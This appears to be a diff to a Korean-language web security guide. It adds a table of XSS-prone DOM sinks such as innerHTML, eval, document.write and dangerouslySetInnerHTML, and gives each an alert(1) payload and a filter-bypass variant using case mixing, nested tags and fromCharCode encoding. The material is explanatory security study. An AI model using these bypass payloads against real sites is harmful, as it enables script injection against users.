@@ -18,6 +18,25 @@
 
 ---
 
+## 📋 XSS 발생 위험이 높은 DOM API & 속성 정리표
+
+| 🚩 메서드/속성                         | 🔍 설명                                  | 💥 XSS 발생 예시                                                                 | 🧪 필터 우회 예시                                                  |
+| --------------------------------- | -------------------------------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------ |
+| `innerHTML`                       | 요소 내부에 HTML 삽입                         | `el.innerHTML = "<img src=x onerror=alert(1)>";`                             | `<img src=x oNerror=alert(1)>`                               |
+| `outerHTML`                       | 요소 전체를 대체                              | `el.outerHTML = "<script>alert(1)</script>";`                                | `<scr<script>ipt>alert(1)</script>`                          |
+| `document.write()`                | 문서에 직접 HTML 삽입                         | `document.write('<script>alert(1)</script>');`                               | `document.write('<img src=x oNerror=alert(1)>')`             |
+| `insertAdjacentHTML()`            | 특정 위치에 HTML 삽입                         | `el.insertAdjacentHTML("beforeend", "<svg onload=alert(1)>")`                | `<sVg oNload=alert(1)>`                                      |
+| `eval()`                          | 문자열을 JS 코드로 실행                         | `eval("alert(1)")`                                                           | `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`     |
+| `Function()`                      | `new Function("code")` 실행              | `new Function("alert(1)")()`                                                 | `new Function(String.fromCharCode(...))()`                   |
+| `setTimeout()`                    | 문자열 전달 시 코드 실행                         | `setTimeout("alert(1)", 1000)`                                               | `setTimeout(String.fromCharCode(...))`                       |
+| `setInterval()`                   | 동일                                     | `setInterval("alert(1)", 1000)`                                              | `setInterval("al"+"ert(1)",1000)`                            |
+| `location.href`                   | 리디렉션                                   | `location.href = "javascript:alert(1)"`                                      | `location.href = "data:text/html,<script>alert(1)</script>"` |
+| `on*` 이벤트 속성                      | 이벤트 핸들러 삽입 (`onclick`, `onerror`, ...) | `el.setAttribute("onmouseover", "alert(1)")`                                 | `el.setAttribute("oNclick", "alert(1)")`                     |
+| `dangerouslySetInnerHTML` (React) | React에서 HTML 직접 삽입                     | `<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />` | `'<svg oNload=alert(1)>'`                                    |
+| `iframe.srcdoc`                   | iframe 안에 HTML 코드 삽입                   | `iframe.srcdoc = '<script>alert(1)</script>'`                                | `<svg onload=alert(1)>`                                      |
+
+---
+
 ## 🔍 설명 보충
 
 * `innerHTML`, `dangerouslySetInnerHTML` 등은 **HTML 구조를 직접 삽입**할 수 있기 때문에, 사용자 입력을 그대로 넣으면 XSS에 매우 취약
